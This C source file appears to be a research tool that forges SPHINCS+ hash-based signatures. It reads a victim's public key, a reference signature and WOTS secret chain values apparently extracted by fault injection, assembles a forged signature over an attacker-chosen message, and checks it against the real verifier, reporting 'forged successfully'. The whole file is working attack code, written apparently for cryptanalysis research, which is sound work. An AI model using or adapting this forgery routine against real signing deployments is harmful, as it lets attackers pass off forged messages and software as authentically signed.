#include <stdio.h>
#include <ctype.h>
#include <stdlib.h>
#include <time.h>

#include "fprintbstr.h"
#include "wots_forge.h"
#include "api.h"
#include "merkle.h"
#include "wots.h"
#include "rng.h"
#include "extras.h"


#define MAX_BUFFER_SIZE 50

int main()
{   
    printf("make sure the reference signature is correct\n");
    srand(time(NULL));
    int random_number = (rand() % 999950);
    unsigned char       random_values[1000000];


    
    // unsigned char message2[36] = "iamavirus whosgonnacorraaaaaaaaaaupt";
    // mlen = 36;

    
    FILE *file = fopen("bash_script_results/out/forged_signature.txt", "w");
    FILE *fp_sig, *fp_pubkey, *fp_source, *fp_rsp, *fp_message;
    char fp_buffer[MAX_BUFFER_SIZE];
    fp_rsp = fopen("bash_script_results/out/verify_forged_signature.txt", "w");
    fp_sig = fopen("bash_script_results/in/ref_signature.txt", "r");
    fp_pubkey = fopen("collected_pubkey.txt", "r");
    fp_source = fopen("bash_script_results/extracted/minimum_wots_sign.txt", "r");
    fp_message = fopen("message_to_forge.txt", "r");
    
    size_t mlen;
    unsigned char *message2;
    unsigned char R[SPX_N];
    unsigned char *sig2, *sig3;
    unsigned char signature_we_have[CRYPTO_BYTES];
    unsigned char source_2[SPX_WOTS_BYTES];
    unsigned char root[SPX_N];
    unsigned secret_values[SPX_WOTS_LEN];
    unsigned char pk[CRYPTO_PUBLICKEYBYTES];
    unsigned char sk[CRYPTO_SECRETKEYBYTES];
    unsigned char entropy_input[CRYPTO_SEEDBYTES] = {0};
    uint32_t idx_leaf;
    uint64_t tree;
    uint32_t layer;
    int ret_val;

    sig2 = (unsigned char *)calloc(CRYPTO_BYTES, sizeof(unsigned char));
    sig3 = (unsigned char *)calloc(CRYPTO_BYTES, sizeof(unsigned char));


    randombytes(random_values, 1000000);
    // memcpy(entropy_input, random_values + random_number, CRYPTO_SEEDBYTES);
    randombytes_init(entropy_input, NULL);

    if (FindMarker(fp_message, "mlen = ")){
        ret_val = fscanf(fp_message, "%u", &mlen);
    }
        
    else
    {
        printf("ERROR: unable to read 'mlen' from <%s>\n", "fp_message");
        return -1;
    }

    message2 = (unsigned char *)calloc(mlen, sizeof(unsigned char));

    if (!ReadHex(fp_message, message2, mlen, "message = "))
    {
        printf("ERROR: unable to read 'message' from <%s>\n", "fp_message");
        return -1;
    }


    
    if (!ReadHex(fp_pubkey, pk, CRYPTO_PUBLICKEYBYTES, "pk = "))
    {
        printf("ERROR: unable to read 'pk' from <%s>\n", "fn_req");
        return -1;
    }

    // if (!ReadHex(fp_pubkey, sk, CRYPTO_SECRETKEYBYTES, "sk = "))
    // {
    //     printf("ERROR: unable to read 'sk' from <%s>\n", "fn_req");
    //     return -1;
    // }


    // memcpy(sk, pk, CRYPTO_PUBLICKEYBYTES);
    randombytes(sk, CRYPTO_PUBLICKEYBYTES);
    memcpy(sk + CRYPTO_PUBLICKEYBYTES, pk, CRYPTO_PUBLICKEYBYTES);

    if (FindMarker(fp_sig, "layer = "))
        ret_val = fscanf(fp_sig, "%u", &layer);
    else
    {
        printf("ERROR: unable to read 'layer' from <%s>\n", "fp_sig");
        return -1;
    }

    if (FindMarker(fp_sig, "tree = "))
        ret_val = fscanf(fp_sig, "%lu", &tree);
    else
    {
        printf("ERROR: unable to read 'tree' from <%s>\n", "fp_sig");
        return -1;
    }

    if (FindMarker(fp_sig, "leaf = "))
        ret_val = fscanf(fp_sig, "%u", &idx_leaf);
    else
    {
        printf("ERROR: unable to read 'leaf' from <%s>\n", "fp_sig");
        return -1;
    }

    sprintf(fp_buffer, "leaf%d_most_secret_value = ", idx_leaf);
    if (!ReadHex(fp_source, source_2, SPX_WOTS_BYTES, fp_buffer))
    {
        printf("ERROR: unable to read 'secret values' from <%s>\n", "fn_req");
        return -1;
    }

    sprintf(fp_buffer, "leaf%d_bi_values = ", idx_leaf);
    if (!read_bi_values(fp_source, fp_buffer, secret_values, SPX_WOTS_LEN))
    {
        printf("ERROR: unable to read 'bi_values' from <%s>\n", "fn_req");
        return -1;
    }

    // for (int i = 0; i < SPX_WOTS_LEN; i++) {
    //     printf("%d ", secret_values[i]);
    // }
    // printf("\n");

    if (!ReadHex(fp_sig, signature_we_have, CRYPTO_BYTES, "signature = "))
    {
        printf("ERROR: unable to read 'signature we have' from <%s>\n", "fn_req");
        return -1;
    }

    randombytes_init(entropy_input, NULL);

    memcpy(sig2, signature_we_have, CRYPTO_BYTES);

    find_apt_root(R, sig2, root, message2, mlen, layer, tree, idx_leaf, sk, secret_values);

    controlled_merkle_sign(sig3, root, source_2, secret_values, layer, tree, idx_leaf, sk);

    memcpy(sig2 + (SPX_N + SPX_FORS_BYTES + layer * (SPX_WOTS_BYTES + SPX_TREE_HEIGHT * SPX_N)), sig3, SPX_WOTS_BYTES);

    fprintbstr(file, "sk_chosen = ", sk, CRYPTO_SECRETKEYBYTES);
    fprintf(file, "mlen = %lu\n", mlen);
    fprintbstr(file, "msg = ", message2, mlen);
    fprintbstr(file, "forged_signature = ", sig2, CRYPTO_BYTES);
    fprintbstr(file, "R prime found = ", R, SPX_N);
    fprintbstr(file, "forged wots signature = ", sig3, SPX_WOTS_BYTES);
    fclose(file);

    if ((ret_val = crypto_sign_verify(sig2, CRYPTO_BYTES, message2, mlen, pk)) == 0)
    {
        printf("forged successfully\n");
        fprintf(fp_rsp, "mlen = %lu\n", mlen);
        fprintbstr(fp_rsp, "msg = ", message2, mlen);
        fprintbstr(fp_rsp, "signature = ", sig2, CRYPTO_BYTES);
    }
    else
    {
        printf("forgery failed\n");
    }

    return 0;
}
